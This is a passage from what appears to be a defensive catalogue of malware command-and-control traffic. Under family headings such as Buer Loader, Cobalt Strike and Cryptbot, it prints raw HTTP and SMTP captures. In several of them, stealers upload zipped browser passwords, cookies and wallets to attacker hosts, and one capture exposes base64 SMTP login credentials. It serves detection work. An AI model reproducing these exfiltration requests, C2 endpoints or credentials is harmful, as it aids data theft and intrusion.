1,1,1,1,1,1,1,2,1,txt;cs;mp3;,https://url.com/file.exeHTTP/1.1 100 Continue

POST /gate.php?id=1&os=Windows%207&cookie=10&pswd=3&version=v1.0%20Beta&cc=0&autofill=2&hwid=90059C37132041A4B58D2B75A9850D2F HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------8d7a52725dea892
Host: 5.188.60.21
Content-Length: 60824
Expect: 100-continue

-----------------------8d7a52725dea892
Content-Disposition: form-data; name="file"; filename="381.zip"
Content-Type: application/octet-stream

PK..........>P\ZWW..........$.Browsers.txt
. .........0.5.....0.5.....0.5.....s..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S..*8..).%5-.4.D.,.Y..a.B.y....._.......Y..._..P.....Z..).t....TV.....@........U....mA..@n:..#..d...PK..........>P~
......L.....$.Domains.txt
. .........0.5.....0.5.....0.5.....+//.......I../J..*G. ...PK..........>Pr.............$.Outlook.txt
. ..........[:......[:......[:.......,.I..s.,I......PK..........>P^.]I........
.$.Passwords.txt
. .........0.5.....0.5.....0.5.......A.. .E.$....4...+S.q..+`.....0XOoMl....'...5.).s..8;b.Jpv....p8..MX......."......63'.>..{...
. .........0.5.....................PK..-.........>P..............$........ ......CryptoWallets/
. ..........[:......[:......[:.....PK...........
........
-----------------------8d7a52725dea892--

HTTP/1.1 200 OK
Date: Thu, 30 Jan 2020 01:53:05 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 56
Content-Type: text/html; charset=UTF-8

1,1,1,1,1,1,1,2,1,txt;cs;mp3;,https://url.com/file.exe
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/borr1.png "Borr")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/borr2.png "Borr")

#### Brushaloader
~~~
POST / HTTP/1.1
Accept: */*
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: patromink.xyz
Content-Length: 47
Connection: Keep-Alive
Cache-Control: no-cache

k=6292&n=6292&m=6292&id=droniks34&m=6292&l=6292

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Thu, 31 Oct 2019 17:51:52 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive

Thank You 22501
~~~
~~~
try {"6f7074696f6e73ProcessorId"; $disks = gwmi Win32_Volume -filter "Name='C:\\'";$disks.SerialNumber}catch{"null"}

6f7074696f6e73ProcessorId 3300537927
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/brushaloader.png "Brushaloader")

#### Buer Loader
~~~
GET /api/update/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ODM0MjIwNTc5ZGIzNGJiMTMzNWNlMmJlNDJmMjBhMTA5MTVjNWQxZThmN2U0OWJjYjY0ODVjODE4NjQwYjk3YzY0NWU5NjAxNGMxY2U3NWQ2MmI5N2MwY2QzNzlhMmQ2ZmM5ZDFjZjIwNWMwMTEwNWVkNDAyZjY0ZDYyMTg0Y2UyZmJhZmEyYTQxMzBhZWRiNmY0ZjI2ZjFjZmI4MTQwMTBiYzE0Y2Y4NjBiM2U2NGE1NTBhNTc0Y2M4 HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Host: loood1.top

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 12 Nov 2019 20:00:24 GMT
Content-Type: text/plain; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive

ODMtMkQtNzItMUMtMEQtOTgtREEtOTAtMzktNjUtREYtNzYtRDktQkYtQkYtNUEtMDUtNEMtRjAtRkMtMjAtQzctMEUtQzMtRDAtODYtMzYtRTQtOTktMDAtN0YtRDAtNjQtNDctMzktMkYtRTktMTMtM0MtNDgtNjktNTQtNDEtMTktRjMtNUUtQTItNjgtQTUtMjQtNkEtNEItNzItQ0UtODUtRDQtMDAtQjctMTYtNEItOUItMDQtQzgtMTctN0UtRDgtQzctMDAtM0ItN0ItQzUtQTQtMTYtQUEtM0UtNEEtRjMtRUItNDUtQTctMEItMTctOTEtNUItNTQtNEEtODUtNzctNEEtQjUtRTYtMUMtNTktRDEtODctNDQtQkItMjAtNkQtNTgtQzEtMEEtNEItNEMtRTEtNTItM0MtRTItMkYtNTktOEUtMkUtRjItRDgtRjQtOTgtMUYtRjEtNTEtQzktMTUtNTAtQkEtNDktMkUtMzAtRDMtMjUtRDMtODctNEItQjYtRjUtN0MtMUUtMjQtRTktOTgtM0MtNTYtNjYtRTUtRDctQ0UtMDAtNUQtNkEtODUtMDEtQjEtMkMtQjctODUtMkQtMzItNjItNUEtM0UtRUQtMTYtMDYtMjYtMDYtRDMtOTYtMDMtOUEtOTEtN0MtMTUtOTEtRkYtQUItMDItQzItNzctRTItN0EtNDEtMEEtQjAtMzItOUEtMEYtRjQtMDMtNzAtMUYtMEItNTEtMDktM0EtNzQtQjEtODgtMzEtMUQtREEtQTItRjQtMzktNkUtMTctRDItRDktNTQtRDUtOEYtMDAtQkEtODEtNkUtNEUtMzUtQTMtNTItRkQtODctRTMtRDYtMkMtNTQtODctQTItNjYtQzgtM0MtMzgtQzctMEEtM0EtOUQtOEEtMzAtRTAtMDgtMzItMTAtMDgtRjItQjYtRkUtMUQtQzctQzgtQUUtOEYtNjctQUUtNTItMDUtQTktMTAtQUYtM0MtOEUtMTMtN0EtNzItM0YtMzAtRTktMzUtRDMtNTQtQkEtOEQtQzAtMzItQTctRkItNDUtQTMtNTctRTQtMUItMzAtODItNEYtOTEtOTktMUMtRDItRjgtMkEtMzYtRTItODktQjItQkItMUItNjYtQUMtMUItOEMtNjQtRUEtN0QtQkQtMkMtOTktQ0QtQzQtQkQtNzgtQzgtOUMtQjAtNkQtNTYtOEUtRDktREEtOTEtMEEtNkMtQUEtQTQtMUUtRTAtQ0MtMzMtRDMtMjAtRTItNjktMjktQzEtRTQtNjEtMTAtMjUtOTgtNjMtOEUtNTgtNzQtRjctNUEtNEYtNDktQzUtNjItNTEtNTAtNTgtNDktM0QtREQtNjctRDctNjEtMTAtMTktRkItNzUtODYtRUItMEYtQzMtRDMtQkQtMjctNkUtQzYtRDktQkYtQUUtNDAtOEEtMUEtMUQtNjctOEMtMjItNjctQjgtNUQtQzItMTUtREQtODMtNzgtNjctN0ItMTMtNDktNzMtRjMtRTAtNEYtMDUtRkYtQjktQ0ItMkEtMDctQkMtRTgtRTMtREQtMUMtNEEtQUQtQjItMTUtNUEtNDMtMTQtQUEtNDEtMUQtNzAtMUEtREQtNTQtMTYtOTAtNjctMTUtNjUtQTgtMjItMTUtMzgtRDYtNjgtOTQtNDMtNDQtQzgtNkQtMUYtNTAtNkMtMTgtMzMtQjUtNzAtOTQtMDQtNzMtRDMtNjQtMTktNDctNjYtNzgtOTEtQkUtQ0ItRTktREItNkQtODgtRkMtOTAtOTk=GET /api/download/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ZGU0Njc4MDI5MWU2NGJhNTYyMDhiMGI4MDlhNDBkNGQ5NjQ2NWQxYjgzNzYwNmIzYjQxZTViZDU4MDE3YjQyZjZmNTVjNg== HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Host: loood1.top

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 12 Nov 2019 20:00:24 GMT
Content-Type: application/*
Content-Length: 2109952
Connection: keep-alive
Last-Modified: Tue, 12 Nov 2019 19:32:38 GMT

.}.<,...XG.V.$.-. ..D.o...S..c].ng.
.cH!.:2;.~.b..JkP...e.,k...7P.]....._0.&..p.U......=J........9?..J.@.
j.^ .h....P.j.S5.q....	h..<.?*u@I^.|.......*..t..5Y.............3.:..v/.(....B.......w.\.|.C............/9...^........F....({..U.{f.c...'......9..%.Z.rJ_.....f....q.#...~..}.....
....k0#.o..............O\....w@..>....E..F.@......4..{#k.hqpxy.....}|....-....B....
~~~
~~~
POST / HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3
Content-Length: 1046
Host: 162.244.81.87

inekece=MDllNzB&diakwadi=iMzE5OG&xycyad=NiNTYxZTcw&ohxiods=MzA0Yj&akreuq=NmZjUy&qosewyic=MzRmMTk5M&amupawel=jdjZGViY&ydsohuu=jljNzMxZDc&orbemaaf=3ZDExMmEx&inhiadfa=ZjA3MG&kyzeafu=UyYzc0M2&alnaexu=M3NGZj&idsavu=Y2VjM2RhO&nyxyygre=GY3YmR&tuxynool=hMmU3Yzc1O&myweka=DNkMDAwYWF&qeozoszi=kOGRlZD&dygyliaz=diNmZkNW&ykdovy=ZiYmVhY&yvabqua=zA4NWEzN&ugsoetl=2Y3ZDk&wymioxi=xNzIwMTIy&uqafsee=Njg1ZTYwNG&cyyqsady=M3NmQwZj&ykuweddy=hkYTQ5ZTV&emlazebe=hYzc5MGVkZ&imirdaby=mJiMzU&doyvku=wYzRhNzQ&roniym=0YTQ5ZDBi&qyaxwe=MTlmZW&uteqop=NkZjdkN2Z&noylke=lNTg5OGJmM&dedynu=DEzNjgxM&suutyfwu=DBkMjFiYm&riitoked=M3NmJjMDg&waliaw=2ZjNhNW&qiubulo=EzZGU2Zm&urehuz=UxNzhjZj&guizpuat=kzYjMzMz&ziapluc=IzODIyYT&orygybib=Y2OGUwY&ebilxufo=2RmYzllM&wesekuy=DVlZThmYTQ&buapxa=3MGVmZDM&lisoxu=xNTlkZ&usgager=TBmOTc4ZDY&cuehlumy=0ZTA5OTZlO&raxyuh=DE2MTA0YWN&piuluwyc=iYjQ4NjE0&gybetez=MzQ3ZW&isvazugo=NhZDExZGEz&obalozha=YmJjZDQ4&pivoewta=NzljOTI&dakiva=xMTE4ND&luzaih=A4OGEz&sesyaci=Mzk0ZWE1YT&opheteow=AxNjQwN&ebzyluo=zBkZWYy&osfiuk=ODc2&yzxaob=NDVmMTViNjdkZDli&exmuur=suirufy
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/buer.png "Buer Loader")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/buer2.png "Buer Loader")

#### Cannibal RAT (aka Ares)
~~~
POST /api/admin_90520735581359/hello HTTP/1.1
Host: 35.192.197.199:8080
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.18.4
Content-Length: 69
Content-Type: application/json

{"username": "admin", "platform": "Windows 7", "hostname": "User-PC"}
~~~
~~~
POST /api/admin_90520735581359/report HTTP/1.1
Host: 35.192.197.199:8080
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.18.4
Content-Length: 26301
Content-Type: application/x-www-form-urlencoded

output=%24+%3C%21DOCTYPE+HTML+PUBLIC+%22-%2F%2FW3C%2F%2FDTD+HTML+4.01+Transitional%2F%2FEN%22%0A++%22http%3A%2F%2Fwww.w3.org%2FTR%2Fhtml4%2Floose.dtd%22%3E%0A%3Chtml%3E%0A++%3Chead%3E%0A++++%3Ctitle%3ETypeError%3A+unsupported+operand+type%28s%29+for+%2B%3A+%27NoneType%27+and+%27str%27+%2F%2F+Werkzeug+Debugger%3C%2Ftitle%3E%0A++++%3Clink+rel%3D%22stylesheet%22+href%3D%22%3F__debugger__%3Dyes%26amp%3Bcmd%3Dresource%26amp%3Bf%3Dstyle.css%22%0A++++++++type%3D%22text%2Fcss%22%3E%0A++++%3C%21--+We+need+to+make+sure+this+has+a+favicon+so+that+the+debugger+does%0A+++++++++not+by+accident+trigger+a+request+to+%2Ffavicon.ico+which+might%0A+++++++++change+the+application+state.+--%3E%0A++++%3Clink+rel%3D%22shortcut+icon%22%0A++++++++href%3D%22%3F__debugger__%3Dyes%26amp%3Bcmd%3Dresource%26amp%3Bf%3Dconsole.png%22%3E%0A+++

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 0
Server: Ares
Date: Thu, 21 Nov 2019 22:54:05 GMT
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cannibal.png "Cannibal RAT")

#### Coala Bot
Uses fake 404
~~~
POST /jjj888/skghn.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/12.0.1576.62 Safari/537.26
Content-Type: application/x-www-form-urlencoded
Host: 185.170.43.187
Content-Length: 120
Expect: 100-continue
Connection: Close

HTTP/1.1 100 Continue

Jk1pY3Jvc29mdCBXaW5kb3dzIDcgUHJvZmVzc2lvbmFsIHgzMiZhZG1pbiY4NjNCLUJFQUItOEZDNi0yMEJGLTlDMDktMkY1NS01OEUxLUExRDYmRmFsc2U(
    
HTTP/1.0 404 Not Found
Date: Tue, 15 Jan 2019 13:20:17 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=euhbs94osbalc0ubsfl5c2v324; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 88
Connection: close
Content-Type: text/html; charset=UTF-8

MTAzNDE2MzR0MTdoYWhkQkZ1amRmYnd1cmhmbmllZmhydWZoYm5maGdmeVREZmJHRlZ5V2d2ZnwxNTQ3NTU4NDE3
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/coala.png "Coala Bot")

#### Cobaltstrike
~~~
GET /Mdt7 HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; NP06)
Host: 198.199.89.56
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 16 Oct 2019 00:03:32 GMT
Content-Type: application/octet-stream
Content-Length: 213589

.......
w.z....=..........C.D.'.'Z.2....:1....R..1...1.......1.9.t...^.......3.Q.3.R.~...~..........6a..6a-L^.............................................`.....W...?...O...=...^...1...T...:.......:..._...U...U...U.v.......v......,9
.W.E.3k..a....9..l.T..k...........J......;J.._.k...$......J....h...'..qD

GET /push HTTP/1.1
Accept: */*
Cookie: TwJl1o2Nzk3+xmC39FsNTbyJPGHyNxllFZ8wZUwR831SYmTwrxoGydXQGF1ej89K1t0rTLgzjd95c8127hlZ6SQ4hx95YrYuRHooitXYGEAxtbKv53LJ6K+6r1y1OQU3n0+O93xxPiyx6RvPeKzlACbO4nEc5YKzh0vAfWJvlm0=
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)
Host: 198.199.89.56
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Wed, 16 Oct 2019 00:05:35 GMT
Content-Type: application/octet-stream
Content-Length: 0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltstrike.png "Cobaltstrike")

Amazon c2 profile
~~~
GET /s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books HTTP/1.1
Host: www.amazon.com
Accept: */*
Cookie: skin=noskin;session-token=MM4bZQ5WUPUrn7TPQuCWct6G+WGXZaLdezMQVEv8PHnB7tnvTk7ct3W71pQmn2NMJQD7IFbjPnKJV27tKshA8AjgzpXoeUtOIrDiBEg0x3AesYq52s74IbjnsVA+wASo0D6L23fd87XNDUiBro5wNBzcybUOADAO1fjCobw5MAw=csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Date: Fri, 13 Dec 2019 17:48:39 GMT
Server: Server
x-amz-id-1: THKUYEZKCKPGY5T42PZT
x-amz-id-2: a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=
X-Frame-Options: SAMEORIGIN
Content-Encoding: gzip
Content-Length: 0
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobaltamazon.png "Cobaltstrike")

Safebrowsing c2 profile
~~~
GET /safebrowsing/ref/eNKSXUTdWXGYAMHYg2df0Ev1wVrA7yp0T-WrSHSB53oha HTTP/1.1
Accept-Language: en-US
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip
Host: novote.azureedge.net
Cookie: PREF=ID=foemmgjicmcnhjlacgackacadbclcmnfoeaeeignjhiphdgidlmahkgbchcahclpfcadjnegckejpiofbmllpnaeancgbikcdjohkekapgnkgiijobnknkgiahmkcjipnncehcamnopcmlngcboppjdplhhobhgekdcblgpkdggeklenpcabdkhhhaedogkacljhdgdphfanfbmcbnkgjmplhdkomllhnnoppchchejooiplahpgpmfaegdcpbnd
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Content-Encoding: gzip
Age: 1609
Alternate-Protocol: 80:quic
Cache-Control: public,max-age=172800
Content-Type: application/vnd.google.safebrowsing-chunk
Date: Fri, 22 Nov 2019 13:34:50 GMT
Server: ECAcc (frb/67BC)
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Length: 82480
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobalt-safe.png "Cobaltstrike safebrowsing")

#### Cobian RAT
~~~
...........................LOGIN|-|ROOT02_392170|-|JONATHAN-PC@Jonathan|-|Microsoft Windows 7 Professional |-|No|-|1.0.20.0 [Black]|-|Program Manager|-|ROOT02_392170,goodattack.duckdns.org,4007,svchost.exe,{VYFGJQ0V-30663-BEMNQX-BEMNQX0BNF},TEMP,False,False,|-|.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cobian.png "Cobian RAT")

#### Collector Project
~~~
GET /get_data.php?info HTTP/1.1
User-Agent: CLCTR
Host: u667503gif.ha004.t.justns.ru
Connection: Keep-Alive

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 66
Date: Fri, 24 Apr 2020 16:45:45 GMT
Server: LiteSpeed
Vary: User-Agent

IP-address: 85.203.44.133_=_Country: Netherlands_=_City: Amsterdam


POST /get_data.php?id=1874255356&cc=0&pc=1&hash=8f41bab4341b7ac42eb623fad118f430 HTTP/1.1
Content-Type: multipart/form-data; boundary=SendFileZIPBoundary
User-Agent: uploader
Host: u667503gif.ha004.t.justns.ru
Content-Length: 1191921
Connection: Keep-Alive
Cache-Control: no-cache

--SendFileZIPBoundary
Content-Disposition: form-data; name="fileToUpload"; filename="zipfile.zip"
Content-Type: application/zip

PK...........P.w..B*..........Screenshot.pngUT
...%.^.%.^.%.^$.uXS........n.	.......P........!.H...}. *9JB....5:Fm0.........:;...9.....W,...!=
.O_c.).c.....y>...k...?u...n.5..........k...../...#*.........pt]3.n\g...?PK...........P....I...........Browsers/passwords.txtUT
...%.^.%.^.%.^.
..R.())(.....KKLNM....K.......O.......V:.....y........R...@..../W<.....PK...........P
...7...........Browsers/AutoFill.txtUT
...%.^.%.^.%.^.K.M.Rp.,*...2y...sJ."..IE..9.\...^.?..>.hF.%..e...Sd6.PK...........P................Browsers/!browsersInfo.txtUT
...%.^.%.^.%.^.............\.c..)....v..	-N-*.IL....q,(pI,I...ON..q..O.I.q.(..M..S.....%....U.g...b.tu.....K.J...cy.x...;.........	.........Cc...&a...Q^
ru..qv$&F.PK...........P..m. ...}.......information.txtUT
...%.^.%.^.%.^-.Oo.0......|..D4.?.
u 6UP."....x..6U.`.../..|...Y/q...UV.J(..g ...8.r.....!.k.`.Y.)$s.NC........{.+..$.2c.......&..*........Q.U..l....&..^+M_Jk..~..?......D}pd]..Qm...w.X.........6...OW.s6c	..
/.`..w..U9*..?..o.}.Q..<B..`..5...2-.8..tV.[.$.....G1B)m.	XL..OX..d2./qk....%.!.......i.8OVb..PK.............P.w..B*........	...............Screenshot.pngUT....%.^PK.............P....I.........	............*..Browsers/passwords.txtUT....%.^PK.............P
...7.........	...........
+..Browsers/AutoFill.txtUT....%.^PK.............P..............	............+..Browsers/!browsersInfo.txtUT....%.^PK.............P..m. ...}.....	...........f,..information.txtUT....%.^PK..........u....-....

--SendFileZIPBoundary--

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Date: Fri, 24 Apr 2020 16:45:54 GMT
Server: LiteSpeed
Vary: User-Agent
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/collectorproject1.png "Collector Project")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/collectorproject2.png "Collector Project")

#### Crimson RAT
~~~
.....info=command.....subdomain-info=user@....|USER-PC|admin||6>1|Ver-3.1||||C:\ProgramData\Dhrolas\|subdomain.....getavs=avpro.....subdomain-getavs=@....264>smss>0><352>explorer>0><796>svchost>0><348>csrss>0><1232>svchost>0><608>svchost>0><3720>windanr>0><692>svchost>0><708>ctfmon>0><864>svchost>0><1872>SearchIndexer>0><3520>SearchFilterHost>0><1384>IMEDICTUPDATE>0><404>csrss>0><1204>spoolsv>0><3484>SearchProtocolHost>0><1824>svchost>0><396>wininit>0><840>svchost>0><1460>qemu-ga>0><2704>audiodg>0><1000>svchost>0><1944>886c394c284f3f334c0e385fe36ec1022037585810b9e39629fcbdc2ac4d27e1>0><464>lsm>0><552>winlogon>0><1352>svchost>0><280>dwm>0><1080>svchost>0><456>lsass>0><4>System>0><448>services>0><2032>taskeng>0><0>Idle>0><
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/crimson.png "Crimson RAT")

#### Cryptbot
~~~
POST /index.php HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------j3v66jdmskc244S
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Host: saas01.pro
Content-Length: 50253
Cache-Control: no-cache

-----------------------------j3v66jdmskc244S
Content-Disposition: form-data; name="file"; filename="C:\ProgramData\AaZ2SXQu2BSEGVOA\SS5KbUwQhOLk.zip"
Content-Type: application/octet-stream

PK.........S_O\...........4...Browsers/Cookies/Mozilla_Firefox_Cookies_fmcIYbZ.txtUT
.....]...]...]..KO.@......SZ...hg.	..!<..n.<..P.....^.n.....|....7.W}:..=..e.....4Yl..S.\I..n...z......C..G.....F.,O....*..]gg........<.t>.=.......fY..ce2...Uo..t...6..$!.$...q<.
..y.KF. p.h$.$..V.Ht".,../.-K.'T..p..B[c........?...&.S.."...b.J.T......(...!B.E1...D\!*N.!....PK.........S_O..K.............Browsers/_FileCookies.txtUT
.....]...]...]..KO.@.......t.....%&H"...J.!3S.0.60......;......ht.\x.}5.....b/...=...|3a.
.Zi.v...0...pj....=.]..<...........D...g=o.5..!..}...M..k..s......Y1,7........&.s. ....W.G..yn*F.$...$...wN.LL.J,%.(.-K}A.......q..h.J....?T.M...'.L)!".JK...p7..?.A!o...Ql8l....Z...0.}.PK.........S_OFq..O...h.......Browsers/_FileForms.txtUT
.....]...]...].K.M.Rp.,*...2...j.8,1..(...T.......V...MQPbJQfz~1/./.SQ~yqj...o~UfNN".....
^..PK.........S_OE.%.{...........Browsers/_FilePasswords.txtUT
.....PA..N6.....).......a.?.C.........g.|......kiQ......^.."./.......:.R.y...7...]}.45.{.D..S]......d*nY.q!.3........P.R.C.....G.B	."...;.o.5....iU.;....$}._..&...e@...wF..PK...........S_O\...........4.	....... .......Browsers/Cookies/Mozilla_Firefox_Cookies_fmcIYbZ.txtUT......]PK...........S_O..K...........	....... ...g...Browsers/_FileCookies.txtUT......]PK...........S_OFq..O...h.....	....... .......Browsers/_FileForms.txtUT......]PK...........S_OE.%.{.........	....... ...I...Browsers/_FilePasswords.txtUT......]PK...........S_OE.%.{.........	....... ......._FilePasswords.txtUT......]PK...........S_O.....	..Fk..	.	....... ......._Info.txtUT......]PK...........S_O..=mK.........	....... ......._Screen.jpgUT......]PK..........&.........
-----------------------------j3v66jdmskc244S--

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 31 Oct 2019 10:30:07 GMT
Content-Length: 3
Connection: keep-alive
X-Powered-By: Express

ok!
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cryptbot.png "Cryptbot")

#### Danabot
Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet 
~~~
00000000  24 01 00 00 00 00 00 00 e5 7c 00 00 00 00 00 00    $....... .|......
00000010  09 7e 00 00 00 00 00 00                            .~...... 
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/danabot.png "Danabot")

#### Darkcloud-fg
~~~
220-sg2plzcpnl456444.prod.sin2.secureserver.net ESMTP Exim 4.95 #2 Mon, 06 Feb 2023 08:00:59 -0700 
220-We do not authorize the use of this system to transport unsolicited, 
220 and/or bulk e-mail.
EHLO DESKTOPJGLLJLD
250-sg2plzcpnl456444.prod.sin2.secureserver.net Hello DESKTOPJGLLJLD [45.86.200.53]
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-PIPE_CONNECT
250-AUTH PLAIN LOGIN
250-STARTTLS
250 HELP
AUTH LOGIN
334 VXNlcm5hbWU6
aW5mb0BrcmlvbmNvbXB1dGVyLmNvbQ==
334 UGFzc3dvcmQ6
cWhyVlNDSyYm
235 Authentication succeeded
MAIL FROM: <info@krioncomputer.com>
250 OK
RCPT TO: <info@krioncomputer.com>
250 Accepted
DATA
354 Enter message, ending with "." on a line by itself
thread-index: Adk6O9KSWRF117oSS/+EnKkCJKo7kA==
Thread-Topic: DC-FG:::DESKTOP-JGLLJLD\admin\45.86.200.110
From: <info@krioncomputer.com>
To: <info@krioncomputer.com>
Subject: DC-FG:::DESKTOP-JGLLJLD\admin\45.86.200.110
Date: Mon, 6 Feb 2023 15:00:59 -0000
Message-ID: <4A2332A508DC4B61B8ACDBC8A9CD1E68@DESKTOPJGLLJLD>
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="----=_NextPart_000_0000_01D93A3B.D2A2B3E0"
X-Mailer: Microsoft CDO for Windows 2000
Content-Class: urn:content-classes:message
Importance: normal
Priority: normal
X-MimeOLE: Produced By Microsoft MimeOLE

This is a multi-part message in MIME format.

------=_NextPart_000_0000_01D93A3B.D2A2B3E0
Content-Type: text/plain
Content-Transfer-Encoding: 7bit


------=_NextPart_000_0000_01D93A3B.D2A2B3E0
Content-Type: application/x-zip-compressed;
	name="Files.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename="Files.zip"

UEsDBBQAAAAIANaRa090OBjdswQAADkMAAAZAAAARmlsZXMvYXV0aG9yZ2FsbGVyaWVzLnJ0Zq1W
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcloud-fg.png "Darkcloud-fg")

#### Darkcomet
~~~
BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCDC8C751A55F2CE98F3201C7FC248AA8FC340C2F20D8436FEDEAF457052D53A8F4BFF6568F5D644E03BDB309B022A095BBC95AECE9ACB25EFD2BA04271017BADF1C0D75325C58BB1A8E3C42814BA1D830DF380472AFFBC7F034344A76764BFCC2DC473B6836F4CF2D8518E9CA4A32A3C5FA402FA2837A9BEE006127A5E073F925EC3F95F680D25EB86F58C423E5C645340002B677EA40FE1648BAE9D11EA4BC915D6E53CEF98429542C22BD7439A33FFE8B48BE44AD038C62AA82985A15A0F7F9E342D9F81EB0DB396D2589D80F51FEE9B296FCCE117FCCC25EB8445EFE7617E0930C3FC1931227EC1E2AC401B18E0AE61924E7402CFBB418711F39C890EB6AAD843903AE1D39A0DF31AFFDECA82F3FA48EB19D122088C809D5CEA3F4C59E8C8D57AB04B3DFDE3DD47B37878AD856643B46CAD5A4DEBC3E677BA446EBAD350549BB36FC8FAAE784C7C1EC91932AEB6A3014F3C11FDB9EBA711B7517E0C4EEFA15FF93BDBE8D0E716D8C7E5F3
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcomet.png "Darkcomet")

#### Darkrat
~~~
POST /request HTTP/1.1
Accept: text/plain
Content-Type: application/x-www-form-urlencoded
User-Agent: agent
Host: 104.244.75.179
Content-Length: 640

